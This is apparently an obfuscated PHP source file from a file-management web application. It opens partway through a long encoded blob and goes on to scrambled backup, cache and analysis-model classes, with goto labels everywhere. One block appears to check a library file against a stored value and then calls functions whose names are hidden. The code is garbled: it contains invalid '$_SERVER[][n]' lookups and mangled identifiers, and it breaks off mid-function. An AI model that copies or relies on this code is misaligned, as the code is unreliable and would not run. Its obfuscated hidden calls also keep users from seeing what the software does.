374\75\235\321\216\156\177\137\24\355\3\2\275\141\117\267\55\1"."\60\326\260\277\275\10\334\26\240\176\201\155\115\213\145\255\132\153\152\16\311\2\175\334\355\20\210\312\6\363\213\113\334\115\222\74\320\274\0\7\27\67\305\164\67\265\312\214\11\273\42\43\53\147\230\122\224\233"."\252\274\273\215\2\221\43\210\253\232\156\77\231\140\156\262\107\354\126\143\324\350\251\275\173\65\150\2\364\50\22\10\172\202\253\270\127\144\220\22\366\4\147\110\201\171\210\243\101\352\373\156\361\222\45\113\350\333"."\256\361\14\66\343\204\146\6\354\316\35\100\341\11\226\122\14\225\213\61\241\26\37\262\175\262\334\331\7\145\335\203\133\120\42\161\265\232\237\41\121\315\323\227\71\363\124\323\75\137\240\27\342\354\110\116\360\37"."\xb4\x80\xfc\x4e\x90\xdf\xd8\x14\xa1\x7d\x59\x27\xfa\x7\x71\x99\xe4\x57\xd\x72\xc6\x96\x9a\x82\xea\x73\x34\xc\x96\xa3\xc\x3f\xb\x45\x7a\xc9\x43\x52\xbb\x9c\x2b\x37\xa5\x0\x40\x5b\x2c\xf5\x40\x83\xa7\x5c\x4a\x9a\x2\x2d\xc7\x6e"."\260\15\356\205\304\110\53\231\114\24\252\315\221\352\306\323\232\144\337\145\322\350\314\337\340\305\20\160\201\352\174\100\16\13\52\110\146\36\231\356\202\306\0\167\257\101\14\17\135\56\242\10\4\275\62\0\216\143"."\105\102\336\115\251\273\5\164\364\20\5\314\120\160\202\11\305\51\11\256\77\310\222\302\342\127\147\231\226\40\303\326\210\235\351\44\224\211\305\22\362\24\105\334\250\227\166\316\204\76\43\201\317\100\223\62\11\33"."\3\133\224\14\61\102\21\244\321\242\253\210\23\212\53\74\267\272\246\132\260\12\361\267\373\102\321\245\41\350\117\265\333\117\375\364\130\23\374\40\55\34\234\41\305\23\234\51\45\320\266\164\206\224\166\272\311\260".base64_decode('pnQHAiHRJZStev19ghNJsomGC3wNURzt7e8m/CtCKDhCGHY7UZGKFOZW11ODIf5WKeybqPDUOD52ww==')."\x61\xd\x6d\xe3\x70\x58\x8a\xcb\xd8\xb0\x26\xa6\x60\xd1\x41\x49\x40\x7\xb2\xb0\x76\x92\x1\x4\x6a\xca\xee\x67\x43\xef\xd0\x6e\x77\x85\x6b\x5e\xe5\x9c\xd9\x59\x11\x16\xa9\x82\xc0\x48\x95\x7b\x76\x3f\xa9\xc6\x6c\xe\x3\x8\x73\x18"."\xdc\x7d\x54\x45\xd9\x74\x79\xa5\xab\xaa\x22\x52\x53\xc9\x54\xc0\x22\xd4\x1a\x2d\x12\x29\x10\x5\xaa\xa1\xb5\xf5\xeb\xb8\xaf\xca\xc8\xa0\xab\x2a\x32\x34\x47\xd0\x48\x5b\xb\x0\xeb\x18\x60\x3c\x4d\xcf\xd4\x90\x97\xc\x86\x65\x54\x55".base64_decode('DJaVD7mqBo+KRIZgsBLAGiE8EnJVVTpa57j7VUPExx63Z8QhXU7t0fLsggDKNSrYSiFrDFEnt88HmA==').base64_decode('suBmz8zmBbLFZ3GicjuG0CWlQNc+FKQGYHmu5G9VyGVRy2ypltqAPGexvLb4AhRqp88TCoqKrjYRRA==')."\x7c\xc2\x5\xc6\x85\xa7\x71\x85\xba\x2\xa1\x4e\x70\x20\x3\xb\xa2\x5e\x97\x88\xb4\x20\x1b\xe9\x19\x3c\xe\x61\xe7\x1f\xa0\x1\x42\x9d\xb0\x1f\x49\x78\x2a\x20\x2c\xb4\x5d\x36\xf7\x5d\x64\xaf\x55\xdc\x87\x38\xc\x8\x99\x4c\x2d\x84"."\x7\x3e\x85\x36\x3f\xd4\x27\xa\xd7\x2b\x1f\x8f\x91\x1e\x80\x7d\x1c\xb5\x7d\x90\x99\x75\x67\x84\x3d\xab\xd7\x2a\xc3\x70\x4d\x2e\x1a\xa5\x72\x54\x5c\xce\xc3\x3b\x9f\x4\x3e\x5d\x7\x1d\x4f\xbe\xcd\x42\xfd\x7d\xd0\x69\x1e\xe4\x4\x51"."\172\320\52\200\374\275\376\150\310\277\332\127\224\0\175\107\227\116\1\353\175\330\117\305\37\1\336\33\100\176\352\54\360\376\336\145\275\201\201\122\250\341\236\76\56\113\10\111\355\236\336\160\124\330\270\342\35\15"."\330\227\261\55\15\125\172\217\353\361\272\332\30\233\146\314\177\33\25\370\311\114\241\153\76\167\307\60\341\144\66\0\164\123\344\345\136\124\110\66\164\72\113\252\200\174\312\220\14\342\121\217\230\354\220\112\36\364"."\260\135\27\61\6\261\235\141\306\324\234\114\275\337\146\351\267\263\314\242\16\72\226\242\316\170\220\365\33\225\14\304\373\357\74\273\104\44\46\147\72\110\325\221\41\270\160\260\227\63\203\112\112\214\166\153\114\357"."\17\255\346\45\212\200\117\46\11\306\52\160\47\343\211\233\5\361\71\46\156\156\16\143\235\334\215\253\140\352\347\254\221\130\213\242\270\144\34\231\47\44\140\155\363\22\346\202\66\157\13\202\23\130\144\171\36\52"."\304\230\317\34\233\175\37\165\61\53\211\226\165\324\121\54\54\0\275\46\4\133\140\210\151\240\130\370\24\66\157\231\230\5\175\263\50\13\116\203\6\160\234\225\211\51\6\124\352\352\247\142\127\251\224\22\237\102"."\x49\x42\x8f\xc6\xe9\x66\x8f\xfa\xc1\x23\x9d\xc4\xfb\xca\xa4\xfd\x5d\xeb\xac\x23\xe\x55\x44\x4f\xb3\xc4\x7c\x8e\x74\xae\xb3\x56\x12\xc8\xb\xf2\x1e\x81\x22\xf0\x91\x5\xeb\x46\x6e\x10\x9a\xe1\x38\x1a\xf4\x12\xa1\xf0\xc1\xe7\x6\x87"."\xf8\xa9\x23\x36\xb4\xe8\x4d\x24\x16\xd3\x5\x63\x34\x25\x41\x87\xe\xbd\x29\x54\x72\x2d\xc1\x40\xf4\xe8\x50\x7f\xa9\x74\xdc\x59\x30\xd9\x6b\x71\x9\x6a\x43\x0\x53\xde\x9a\x8e\xbe\x28\x56\x26\x89\x1f\x98\xb2\xb8\x46\xb4\x15\xa2\xe3"."\x34\xaf\xc2\x1d\x98\xa0\x5c\xbc\x1d\xdc\xbb\x2a\x0\x81\xbd\xf\x7a\xaa\x87\x77\xc\xf7\x7b\x87\x1f\x51\xa2\x3e\x60\x3d\x89\x84\x1d\x1c\xd6\x18\xb0\xd8\x77\x9e\x8b\x79\xaf\x25\x6e\xfa\xc1\xa6\x34\xe4\xf\xf4\x56\x54\x42\x29\xcb\xe2"."\167\240\147\222\71\122\7\43\211\326\361\36\171\202\17\24\213\320\124\106\247\206\45\202\335\121\132\162\63\20\303\32\127\142\214\155\23\106\332\325\347\146\240\66\332\115\354\335\34\142\154\15\137\55\20\13\15\20".base64_decode('mXUcW1ERXtrIPHTSLdF4Vo1L3YFOuB/3+kPLpJRiSlwQQrcb1pmPnEag00BK+DGqGoOCTnRy4rS4Jw==')."\x62\xbb\x14\xd1\x75\x27\x2c\xa8\xa8\x60\x3c\xea\x62\x71\xf0\xd8\xc5\x99\x60\xc6\xb7\x36\x5c\x2a\x38\x14\xe5\x10\xbf\x2f\xe4\x81\xbb\x1c\x2b\xaf\x40\x60\xb2\xff\xb1\x96\x33\xa9\xc0\xb\x84\xd2\xdf\x2e\x94\xf8\x2e\xc1\xcf\xf0\x43\x17".base64_decode('IYOaG1MNlbMB2lWTIn5RX6KmCAjQWRm3SGfdyr5TZCnN4xiHPMYm2OTiIREfJcxTRzXkap6OP4kKtw==').strrev(';\'z^@*?ʈldJTQmMN.WgAaQ$,X'."\0".'E'."\r".'V]y')."\233\105\101\40\107\72\340\261\26\252\200\203\137\357\107\321\15\62\231\72\252\206\214\137\211\315\47\206\371\3\121\374\360\27\216\272\355\242\161\22\31\222\42\313\44\301\15\222\233\236\107\62\137\341\360\130\332\107".base64_decode('nfK4TBqCYG61yv3GUue5sCjyaVg3bMmsauiBD2rxSqzwWfNw1O5tNy1K00VlQVl75nJAPokb+TMEqQ==')."\131\252\106\276\42\270\327\124\251\211\276\135\300\77\201\136\235\363\145\363\364\331\142\154\224\335\245\32\374\15\22\44\154\360\115\25\224\340\264\354\144\21\300\142\365\337\115\253\301\234\267\102\203\226\134\122\23\133"."\x8d\x98\x9c\xf\x30\x13\x7\xa\x61\x63\x6f\x7\x3c\x14\x37\xfb\x10\x49\x75\x2b\x63\x8a\x35\xfb\x8c\x65\x19\xf6\xd5\x81\xb\x2d\x80\xb\x40\xf3\x14\xae\x21\x4d\x21\x82\x88\x62\xe1\xb7\x28\x22\x90\x2e\x32\x97\x15\x1c\xfd\xd3\x5f\xe8"."\221\207\211\262\260\276\102\201\304\310\52\102\176\51\153\265\27\15\6\260\235\50\261\120\232\207\321\242\304\36\205\153\315\221\272\72\154\253\5\164\166\47\347\30\213\202\303\10\220\260\63\44\20\340\323\212\246\11"."\124\303\374\116\261\215\52\162\62\313\16\254\301\242\35\6\54\56\345\300\142\7\144\16\74\326\66\51\206\105\357\275\250\136\141\146\233\243\46\330\10\211\227\370\116\232\12\125\322\50\213\340\124\213\123\5\52\146"."\174\107\314\215\55\2\202\330\35\246\13\373\36\301\51\72\330\75\60\237\267\26\64\302\65\300\16\153\106\57\71\104\24\300\36\163\12\71\77\176\246\301\2\325\205\335\211\350\77\31\373\6\342\36\360\11\72\370"."\132\37\166\6\104\232\55\26\111\35\62\241\37\270\177\1\23\225\131\222\273\213\35\70\101\167\235\124\262\20\334\333\22\157\132\56\161\373\100\20\244\46\211\17\260\145\2\101\351\14\10\156\16\24\100\263\122\224".base64_decode('MUtDLbMSoTCSQ8+CMuqDPUp+vEqSSd8wzrdp4iM1tAmY2Iu+gX4hX3TgNjoYwatGN9LwNEJYFnXA2w==')."\x51\xf0\x83\xf7\x13\x86\x83\xbf\x69\xe0\xc0\x37\x1d\xc8\xac\xc8\x4e\x6e\x19\xee\x42\xb\xf4\x38\xff\x3e\xac\x70\x58\xac\x8b\x45\x6\xb6\x8b\xbf\xac\xd3\x6c\x19\x82\xf6\x8e\xd\x6b\xc5\x9e\x2e\xb8\x3\xab\x5c\x21\xcb\x3d\x85\x81\x88"."\165\73\120\324\140\241\205\5\75\343\100\372\311\16\372\170\243\255\73\204\72\104\115\241\215\114\364\264\15\130\211\336\375\326\322\211\73\144\44\375\3\71\12\173\13\301\111\215\350\146\250\64\232\152\241\114\260\375"."\xe6\x67\xee\xf8\xe9\xd9\xbc\x7d\x8d\x58\x95\x4d\xd4\xd6\x35\x2c\x12\x37\xdc\x7c\xe4\xb8\x13\x22\xfa\x18\x3a\xfe\xa1\x67\x8b\x8c\x16\x24\x2b\xa5\x49\xf4\xbd\x5b\x71\x6e\xa3\x44\xab\x57\x67\xf2\x42\xb1\xc0\xdb\x6d\x3c\xf8\xbf\x9a\x10"."\236\122\262\71\316\44\34\1\262\222\205\56\50\365\225\377\177\75\160\234\312\337\320\41\56\217\131\335\330\221\115\66\117\26\44\154\161\57\0\106\303\303\246\224\231\16\344\62\223\366\46\343\127\124\377\373\112\123"."\x71\x59\xb6\x3a\x31\x43\xa9\x5c\x56\x80\xc\x84\x7e\x99\x9e\x8b\xa7\x6c\x2b\x3f\x16\x37\x84\xb1\x15\x4e\x87\x14\x33\x0\x7d\x1a\x90\x91\x17\x36\x60\x20\xc5\x82\x26\xac\xfe\x20\xc6\x4\x1f\xfe\xfa\x1a\xac\x18\xad\xc9\xc\x3b\x26\x3a".base64_decode('d3l10FsO3HUKIlMLyQpPKYtPI6CCwoJLyeKi0ZadVJLQLFKKQP4FPZ3stQt4F8yrAGOcN5kaTzE16w==')."\203\73\1\172\360\11\304\7\313\356\0\304\271\361\231\60\363\22\66\240\50\133\11\63\31\314\60\125\220\360\211\260\312\245\77\324\120\301\55\24\71\125\340\75\345\141\22\207\370\200\64\210\62\252\43\253\12\231"."\373\310\347\64\376\254\260\150\360\365\201\207\172\251\175\6\214\10\147\152\110\206\146\211\151\121\274\206\17\206\341\20\25\26\131\55\20\237\53\65\1\160\45\40\365\221\225\13\5\51\157\205\12\334\310\156\32\346"."\x21\xbd\x67\xe5\x15\xa8\x41\xdf\xb0\xfc\xc1\xe2\x98\xcf\xf3\x4e\x22\xc5\xd9\x2a\x67\xe5\xe4\xfb\x88\xa9\x84\xa8\x1c\x96\x18\x89\x70\xa9\x15\x69\xc2\xb\x37\x72\x28\xce\x7c\xdb\xd2\x87\xdf\xe8\x7b\x70\x32\x73\xd1\x3\x7d\x1b\xb1\xdd"."\x29\x3e\xb1\x23\x28\x99\xc\x5f\x35\xc4\x7\x79\x32\x31\x59\x77\x1\xe2\x1a\x31\xa9\x2f\xb8\x52\x11\x51\x72\x2d\xb1\xd\xa2\x12\x9\x6f\x40\x4e\x8d\x8f\x94\xf0\xfd\x4\xbb\x1e\xaa\x41\x9\xc\x5b\x58\xe6\x8a\xd0\x38\xf\x1\xab\x21"._kodDe('LVBEEpUOpRNxggMeZJGgyfVufuIWKQx1pfPj8imi2rmQHfcTkQLXnacHDcmRdS7R+fT8D4UqHaCRJ5k=')."\x41\x6\xc7\x48\x86\xd8\xb7\x96\xd3\x4a\xb4\x72\xe6\xb\xf6\xb7\xbf\xb1\x8\x2d\xe6\x12\xbd\x85\x15\x7f\x80\xcd\x58\x31\xb\x5f\x5f\x70\x1c\xbe\x31\x6e\x3d\x46\x10\x8b\xc6\x17\xf1\x70\x73\x1b\x84\xfb\x50\x97\xad\x78\x36\xc5\x4a\x4e".base64_decode('K9XAB6ziZguExIrSedmna6jRVihbNASjMkGjK2TnbLZDXyDfCxci+HFVVUN6C56QBPibFOrvqUDe5A==')."\41\0\6\360\3\175\153\210\364\262\106\232\45\11\377\341\147\32\53\140\62\54\144\215\344\357\345\17\145\127\112\374\171\101\234\116\10\34\310\273\35\32\43\25\170\301\53\350\2\131\337\306\200\356\254\255\323\244"."\xa5\x14\x5a\x5c\xd3\xd\x1\x4d\x78\xfd\x65\x39\xf4\xf2\x8f\x83\x3d\x6a\x8e\x3e\xc9\x42\xa8\x9f\x66\x27\x23\x81\x63\xa5\xca\x7\x3\x1f\x32\x2d\x43\x4\x5\x3e\x2a\x65\x2\x39\x5a\xe2\x3\x8a\x36\x88\x78\xcf\x67\xd9\xfa\x11\x1d\x29"."\x11\x24\xdc\xf8\x40\x6b\x1\xab\x13\x5f\x94\x88\xc0\xf4\x41\x56\x52\x82\x70\x51\x61\xbd\x32\x62\xcf\xc9\x17\xb1\xb6\x82\xda\x2d\x24\xa3\x5c\xf4\x6d\x3f\xf0\xb\x9f\xcd\xf0\x73\x6f\x1b\x28\x19\x1f\xa3\x7a\xc6\x64\xa6\x3f\x64\xcf\xd5"."\157\221\236\205\13\246\70\42\110\276\253\101\31\143\240\226\350\37\117\136\265\347\60\323\252\236\150\123\163\11\73\176\41\27\143\120\216\16\6\243\255\24\30\110\136\234\273\333\340\302\102\304\371\253\74\306\57\33".base64_decode('uMyaSHTIYyVQmW08gwIIQ0WikvC6D/f+rIyLXyd4yeJlCCIWQ/nrP/Z2oWmkigzSJT4bxMiNgxBOnA==')."\xb9\x57\xc4\x45\x41\x5f\xda\x2e\xa8\x7e\xc8\xfd\x2e\xe2\x3a\xb2\xdd\x26\xff\xa4\xf5\x91\x22\x86\xc6\xc4\x38\x80\x83\xcc\x8\x9c\x16\xa8\xcd\x1\x35\x3c\x80\xa4\xb\xb2\x2d\x89\x6c\x75\x85\xe2\x4b\xee\x88\x2d\xa4\xd0\x2d\x14\x27\x5e"."\x31\xcd\x98\x21\x54\xfa\x23\x9c\x5e\xad\x5d\x2c\x3c\xe8\xc4\x13\xe8\xba\xa7\x59\x3a\x5f\xe0\xad\xac\x61\x4\x33\x28\x26\x5a\xaa\x63\x1f\x5a\xb4\xdd\xe0\x74\x89\x81\x59\x74\xba\x87\xd3\x3c\xd6\x24\x8c\xaf\xd8\x6a\x2f\x66\xb0\xb7\xc"."\xe7\xd0\x8b\xfa\x87\xe4\x29\xfd\x69\xfb\x7\x68\xf7\xd8\x2f\x78\x79\x21\xc2\x6e\xa7\xe8\xf6\x39\xac\x95\xc8\x83\x6b\x54\x32\x1b\x4e\x82\x39\xb9\x60\x67\xc9\x6b\x8c\xab\x66\x3c\x5d\x32\x2f\x4e\x82\x79\x8b\x92\x69\x66\x61\xe3\x2e\xe4"."\x33\xe5\x82\x31\x43\xf3\x8a\x3b\xf\x4d\x23\x5b\xd7\x91\x6\x73\x2f\xf1\x2\xea\x4c\xfd\x59\x12\xb9\xf8\x73\x84\x78\xec\xd8\x68\xc3\x5d\xba\x16\x25\xf\xe\x66\xaa\x45\x49\xe4\x19\x6b\xc1\xb1\x6d\x97\xca\xa5\xf8\x21\x4d\x29\xc1\x1"."\371\35\160\61\257\345\151\45\156\244\161\231\160\41\16\132\224\66\213\222\305\353\355\322\27\340\301\222\263\330\260\336\114\333\340\142\307\160\257\235\304\217\347\110\216\72\276\2\331\271\103\111\250\353\355\321\355\235"."\x43\x65\x3b\x9b\x8b\x66\x4a\x7b\xb9\x82\xe0\x16\xb8\xa4\x8f\x67\x7\xdc\x21\x17\x6f\x41\x33\xd4\x2d\x9a\xe8\x1\x1b\x6f\x56\x34\x53\x8d\xb\x9a\x30\x10\x28\x3a\x71\xc6\xe9\xf4\x23\x19\x7e\x96\x46\x24\x1\x7c\x99\xe9\x15\x15\xbb\xdf".base64_decode('vn39jruv2bH58h1nbth21vmO7adctf3ik7ZffNq2ky/fdsG1OGH7Jce9c8GZi6XtJx0NE8874a17bg==')."\307\377\156\273\362\256\267\67\377\166\307\326\315\30\145\333\226\273\336\336\162\325\216\215\327\156\77\361\216\355\277\274\154\373\271\47\36\41\164\12\250\267\316\175\101\132\56\141\113\244\273\370\251\255\305\23\71\136".strrev('gCAP_A09"a93fo7M!)xnPB_5')."\x11\x1b\x42\x41\x72\xd3\x5\x37\xbc\x21\x5\xa7\x22\xe6\x65\x89\xc0\xb3\x78\x16\x9\x16\x1f\xba\x77\x14\x6c\x57\x6b\x1c\x0\xb6\xaa\x31\x6d\x82\x50\x17\x7a\xdd\x88\xd7\x7\x1e\x9a\x93\x6e\xb1\x4b\x7f\xfc\x71\xb\x42\xde\xa2\xd6\x0"."\122\337\63\334\70\305\115\124\375\235\250\14\47\171\207\223\251\372\221\354\11\64\35\231\13\324\157\52\201\234\42\362\42\360\43\362\350\44\252\67\20\216\372\126\372\103\341\120\121\122\237\47\24\32\10\4\275\130"."\135\270\50\31\345\22\124\64\212\222\372\272\2\275\63\245\371\172\74\376\356\242\64\250\262\1\225\230\351\123\261\70\311\337\207\152\351\351\356\246\72\203\305\265\360\267\57\343\65\101\127\212\374\250\70\237\326\350"."\xc9\xab\x4d\x9f\x89\x9e\xac\x87\x64\x3a\xff\xc4\xd7\x51\x94\x2c\x3b\x9\x13\x8a\xb0\x9e\x4b\x88\xc3\x6c\xd0\xe7\x8b\x59\x20\x5f\xb4\x29\x11\xe4\x9\xa8\x56\xd1\x4b\xa\xb\x52\xef\x9e\xbd\xbe\xe5\x9c\x97\x30\x1\x19\x35\x48\xd4\xd9"."\212\312\111\213\277\153\361\75\11\176\241\352\262\134\274\12\160\64\221\20\267\23\10\124\134\311\21\200\350\37\333\56\211\154\235\133\174\315\113\347\257\375\216\31\246\362\216\203\355\133\112\275\200\14\153\61\341\26"."\xa\x33\x47\xb\x5b\x14\x15\x68\x70\x98\x24\xff\x1f\x17\x35\x1e\xee\x1\xc7\x0\x0"."".base64_decode('').""."".strrev(''), 10, -8))); goto eԭ; aҨ: $D = LIB_DIR . $_SERVER[][796]; $C콐ʪ = $_SERVER[][797]; if ($_SERVER[$_SERVER[][776]] != $C콐ʪ($D)) { goto D߳; D߳: $d = $_SERVER[][778]; $Fř = $_SERVER[$_SERVER[][779]] . $_SERVER[][780]; $cÉ = $d($Fř); goto Dݔ; Dݔ: $fī = explode($_SERVER[][217], $cÉ); if (count($fī) < $_SERVER[][550]) { $EǍŸ = $_SERVER[][781]; $EǍŸ(); } $f = $_SERVER[][782]; goto aʗ; aʗ: $f($D); goto Cآ݋; Cآ݋: } goto D; cʢ: class BackupFile { public function __construct() { } public function index() { goto b͉; b͉: $A = Backup::get(); $Dñ = $A[$_SERVER[][281]][$_SERVER[][167]][$_SERVER[][419]]; $B = array($_SERVER[][420] => array($_SERVER[][733], $Dñ), $_SERVER[][734] => array($_SERVER[][319], $A[$_SERVER[][690]])); goto B܏; B܏: $d䍃 = (int) Model($_SERVER[][717])->where($B)->count($_SERVER[][419]); $Cس = (int) Model($_SERVER[][717])->where($B)->sum($_SERVER[][77]); $Ẹ = new TaskFileTransfer($_SERVER[][735], $_SERVER[][712], $d䍃, LNG($_SERVER[][713]) . $_SERVER[][714] . LNG($_SERVER[][736])); goto fժ; e: $C̕ = 1000; $d = $Eſۅ = 0; $EڈȂ = array(); goto bԳ۬; fժ: $Ẹ->task[$_SERVER[][697]] = $Cس; $cƣ = array($_SERVER[][737] => $d䍃, $_SERVER[][738] => $Cس); Backup::set($cƣ); goto E; a: $BЈ = $BЏ ? 1 : 0; $cƣ = array($_SERVER[][749] => 1, $_SERVER[][449] => time(), $_SERVER[][707] => $BЈ, $_SERVER[][746] => $Dñ, $_SERVER[][738] => $Cس, $_SERVER[][737] => $d䍃); if ($Eſۅ) { $cƣ[$_SERVER[][747]] = $bݚ; $cƣ[$_SERVER[][748]] = $dݯΪ; } goto Fᗞ; bԳ۬: $dݯΪ = $bݚ = 0; do { $A珥 = $_SERVER[][739]; $Fː = Model($_SERVER[][717])->where($B)->field($A珥)->order($_SERVER[][740])->selectPage($C̕, $f⧍); $Dժ̺ = !empty($Fː[$_SERVER[][354]]) ? $Fː[$_SERVER[][354]] : array(); foreach ($Dժ̺ as $A) { goto C˫; dӛ褂: if (IO::exist($ä)) { $Ẹ->updateFileEnd($A[$_SERVER[][28]], $A[$_SERVER[][77]]); } else { $ä = get_path_father($ä); IO::mkdir($ä); if (!IO::copy($cʰ, $ä, $_SERVER[][743])) { write_log($_SERVER[][744] . $cʰ . $_SERVER[][745] . $ä . $_SERVER[][478], $_SERVER[][712]); $BЏ = !1; break; } } $Dñ = $A[$_SERVER[][419]]; $Eſۅ += 1; goto cՋ; C˫: if (!$this->_fileExist($A, $EڈȂ, $Cי)) { $d䍃 -= 1; $Cس -= (int) $A[$_SERVER[][77]]; write_log("\x66\151\x6c\145\x20\x6e\x6f\164\x20\145\170\151\163\x74\56\146\x69\x6c\145\x49\x44\x3a{$A[$_SERVER[][419]]}\x2c\40\x70\x61\x74\150\x3a{$A[$_SERVER[][75]]}", $_SERVER[][741]); continue; } $cʰ = $A[$_SERVER[][75]]; $ä = "\173\151\157\72{$A[$_SERVER[][690]]}\x7d" . substr($cʰ, strlen("\173\x69\157\x3a{$A[$_SERVER[][742]]}\175")); goto dӛ褂; DǮ뷨: if ($d >= 1024 * 1024 * 100) { $cƣ = array($_SERVER[][746] => $Dñ, $_SERVER[][747] => $bݚ, $_SERVER[][748] => $dݯΪ); Backup::set($cƣ); $d = $Eſۅ = 0; } goto C՟; cՋ: $d += $A[$_SERVER[][77]]; $bݚ += 1; $dݯΪ += $A[$_SERVER[][77]]; goto DǮ뷨; C՟: } $d֍ = count($Dժ̺); $f⧍++; } while ($d֍ == $C̕); $Ẹ->end(); goto a; Fᗞ: Backup::set($cƣ); $this->_fileFilter($EڈȂ); return !0; goto bڼ; E: $BЏ = !0; $Cי = $this->storeIds(); $f⧍ = 1; goto e; bڼ: } private function _fileExist($d㍏, &$eм, $E胴) { goto B; B: $aַ =& $_SERVER[]; $DɃڱ = $d㍏[$aַ[75]]; if (in_array($d㍏[$aַ[419]], $eм)) { return !1; } goto Eަ; Eަ: if (!in_array($d㍏[$aַ[742]], $E胴)) { return !1; } if (IO::exist($DɃڱ)) { return !0; } $E儠» = get_path_father($DɃڱ); goto b; b: if (IO::exist($E儠»)) { $eм[] = $d㍏[$aַ[419]]; return !1; } $a誨ˡ = array($aַ[742] => $d㍏[$aַ[742]], $aַ[75] => array($aַ[750], "{$E儠»}\45")); $cٿ = Model($aַ[717])->where($a誨ˡ)->field($aַ[420])->select(); goto d; d: $eм = array_merge($eм, array_to_keyvalue($cٿ, $aַ[33], $aַ[419])); return !1; goto C; C: } private function _fileFilter($Fڷ) { $A =& $_SERVER[]; if (empty($Fڷ)) { return; } $D˩ = array($A[419] => array($A[7], array_unique($Fڷ))); $Fֆ֌ = Model($A[751])->where($D˩)->field($A[369])->select(); foreach ($Fֆ֌ as $a) { Model($A[751])->remove($a[$A[369]], !1); } } private function storeIds() { $a =& $_SERVER[]; $e鄤 = Model($a[702])->listData(); $c֊ѳ = array(); $b۪ȵļ = $GLOBALS[$a[6]][$a[84]][$a[752]]; foreach ($e鄤 as $Fͼܣ) { $Bј = strtolower($Fͼܣ[$a[90]]); if (!isset($b۪ȵļ[$Bј])) { continue; } $BȬĒ틋 = $a[71] . (isset($b۪ȵļ[$Bј]) ? $b۪ȵļ[$Bј] : ucfirst($Bј)); if (!class_exists($BȬĒ틋)) { continue; } $c֊ѳ[] = $Fͼܣ[$a[367]]; } return $c֊ѳ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto eղ; eղ: $Eǋ =& $_SERVER[]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto a; b᩸: switch ($Cуݯ[$Eǋ[753]]) { case $Eǋ[17]: self::$handle = Model($Eǋ[755]); break; case $Eǋ[756]: self::$handle = new CacheRedis($d, $aݴ); break; case $Eǋ[757]: self::$handle = new CacheMemcached($d, $aݴ); break; case $Eǋ[167]: self::$handle = new CacheFile($d, $aݴ); break; default: break; } return self::$handle; goto dȮϞ; a: $Cуݯ = $GLOBALS[$Eǋ[6]][$Eǋ[337]]; $d = $Cуݯ[$Cуݯ[$Eǋ[753]]]; $aݴ = $Cуݯ[$Eǋ[754]]; goto b᩸; dȮϞ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($d伈) { if (is_array($d伈) || is_object($d伈)) { $d伈 = json_encode($d伈); } $d伈 = rawurlencode($d伈); return KOD_SITE_ID . $_SERVER[][70] . $d伈; } public static function get($F㸏) { $F = self::key($F㸏); if (!isset(self::$memoryCache[$F])) { $D = self::init()->get($F); self::$memoryCache[$F] = unserialize($D); } return self::$memoryCache[$F]; } public static function set($aښѢ, $a, $c = false) { goto aˆ; d뭆: CacheLock::lock($aښѢ); $Dؓ = self::init()->set($Dߴ, serialize($a), $c); self::$memoryCache[$Dߴ] = $a; goto fν; aˆ: $Dߴ = self::key($aښѢ); if (isset(self::$memoryCache[$Dߴ]) && self::$memoryCache[$Dߴ] === $a) { return !0; } if ($c === 0) { self::$memoryCache[$Dߴ] = $a; return !0; } goto d뭆; fν: CacheLock::unlock($aښѢ); return $Dؓ; goto b; b: } public static function remove($bѓ) { goto aڋ; Cł: CacheLock::lock($bѓ); $F՜ܦ = self::init()->remove($bȪ); CacheLock::unlock($bѓ); goto f˪ġ; f˪ġ: return $F՜ܦ; goto eᒄ; aڋ: $bȪ = self::key($bѓ); unset(self::$memoryCache[$bȪ]); self::clearTimeout(); goto Cł; eᒄ: } public static function clearMemory($a = false) { if ($a) { $a = self::key($a); unset(self::$memoryCache[$a]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[][758])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[][759])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($D蹅, $c) { $E =& $_SERVER[]; $this->cachePath = $D蹅[$E[75]]; $this->prefix = $E[760]; $this->cacheTime = $c; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($eɅ) { $A䛧 =& $_SERVER[]; $eɅ = str_replace(array($A䛧[761], $A䛧[93], $A䛧[69]), $A䛧[762], $eɅ); return $this->cachePath . $A䛧[763] . $eɅ . $A䛧[764]; } public function set($BѲў, $fʼ, $D㰌س = false) { $FÍӝ = $this->getFile($BѲў); if (file_put_contents($FÍӝ, $this->prefix . $fʼ, LOCK_EX)) { return !0; } @unlink($FÍӝ); return !1; } public function get($A) { $C = $this->getFile($A); if (file_exists($C) && filemtime($C) < time() - $this->cacheTime) { @unlink($C); return !1; } $E֗ = @file_get_contents($C); return substr($E֗, strlen($this->prefix)); } public function remove($CŅ) { $b = $this->getFile($CŅ); return @unlink($b); } public function deleteAll() { $FȢ =& $_SERVER[]; $f֬ռ = scandir($this->cachePath); foreach ($f֬ռ as $Cާᄞ) { $aی = $this->cachePath . $Cާᄞ; if (strpos($aی, $FȢ[764]) && strpos($aی, $FȢ[765])) { @unlink($aی); } } } public function clearTimeout() { $e؟Տ =& $_SERVER[]; $Aܒ = scandir($this->cachePath); foreach ($Aܒ as $e̠) { $BÈ = $this->cachePath . $e̠; if (strpos($BÈ, $e؟Տ[764]) && strpos($BÈ, $e؟Տ[765]) && filemtime($BÈ) < time() - $this->cacheTime) { @unlink($BÈ); } } } } goto e; aՅؠ: class AnalysisModel extends ModelBaseLight { public function init($Fߐ) { $B򃶒 =& $_SERVER[]; $b߻ = array($B򃶒[537] => array($B򃶒[29] => $B򃶒[2033], $B򃶒[261] => array($B򃶒[210], $B򃶒[699], $B򃶒[2034], $B򃶒[2035])), $B򃶒[2036] => array($B򃶒[29] => $B򃶒[2037], $B򃶒[261] => array($B򃶒[210], $B򃶒[697], $B򃶒[2038], $B򃶒[2039], $B򃶒[2040]))); if (!isset($b߻[$Fߐ])) { return !1; } $this->optionType = $b߻[$Fߐ][$B򃶒[29]]; $this->field = $b߻[$Fߐ][$B򃶒[261]]; return !0; } public function listData($B׺ = false, $EحЈ = "\155\x6f\144\x69\x66\171\124\x69\x6d\145", $eڇ = false) { return parent::listData($B׺, $EحЈ, $eڇ); } public function trendList($B؊ҟ) { goto 